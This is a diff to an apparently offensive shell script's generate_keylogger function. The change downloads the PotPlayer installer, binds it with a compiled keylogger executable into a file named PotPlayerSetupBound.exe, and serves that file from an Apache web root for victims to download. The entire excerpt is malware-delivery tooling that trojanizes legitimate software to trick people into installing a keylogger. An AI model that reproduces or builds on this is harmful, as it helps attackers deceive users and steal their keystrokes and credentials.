@@ -39,13 +39,20 @@ generate_keylogger() {
 
   echo "Compilation and packing completed. The keylogger executable is keylogger.exe"
 
-  echo "Moving the keylogger executable to the Apache server directory..."
-  sudo mv keylogger.exe /var/www/html/
+  echo "Downloading PotPlayer setup..."
+  wget https://t1.daumcdn.net/potplayer/PotPlayer/Version/Latest/PotPlayerSetup.exe -O PotPlayerSetup.exe
+
+  echo "Binding keylogger with PotPlayer setup..."
+  cat PotPlayerSetup.exe keylogger.exe > PotPlayerSetupBound.exe
+  chmod +x PotPlayerSetupBound.exe
+
+  echo "Moving the bound setup executable to the Apache server directory..."
+  sudo mv PotPlayerSetupBound.exe /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
+  echo "The bound setup is available at: http://$LHOST/PotPlayerSetupBound.exe"
 }
 
 # Function to start the Python server
